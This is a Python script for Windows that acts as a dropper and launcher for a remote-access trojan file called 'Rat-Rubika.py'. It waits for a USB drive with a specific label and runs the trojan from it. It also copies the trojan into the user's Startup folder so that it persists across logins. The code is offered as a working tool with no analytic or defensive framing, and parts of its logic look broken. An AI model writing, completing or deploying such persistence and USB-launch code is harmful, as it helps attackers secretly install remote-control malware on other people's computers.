import os
from os import system as s
import subprocess as sb
import sys as sy
import psutil as ps
import win32api as wa
import sys
from time import sleep as sp

def startup(username):
    import os
    from os import system as s
    drives = sb.getoutput('fsutil fsinfo drives').split()
    folder_startup = ["C:/","Users/",username+'/',"AppData/","Roaming/","Microsoft/","Windows/","Start Menu/","Programs/","Startup"]
    for i in folder_startup:
        os.chdir(i)
    os.system('xcopy '+drives[-1]+'Rat-Rubika.py .')
    dra = sb.getoutput('dir').split()
    for i in dra:
        if i == "Rat-Rubika.py":
            print("OK FILE EXIST")  
def removeble():
    def get():
        get_drives = sb.getoutput('fsutil fsinfo drives').split(' ')[1:]
        last_drive = get_drives[-1]
        len_drive = get_drives.index(last_drive)
        
        return len_drive + 1
    while 1:
        for drive in range(0, get()):
            try:
                rmv = ps.disk_partitions()[drive][3].split(',')[1]
                
                if "removable" in rmv:
                    disk_name = ps.disk_partitions()[drive][1]
                    disk_label = wa.GetVolumeInformation(f'{disk_name}\\')[0]
                    
                    if disk_label == "Sinoce":
                        print("FIND DRIVE ) -- >> "+str(disk_label))
                        s(f'start {disk_name}Rat-Rubika.py')
                        sys.exit()
                    
            except IndexError:
                pass
        sp(2)
removeble()

startup('H-A-C-K-E-R')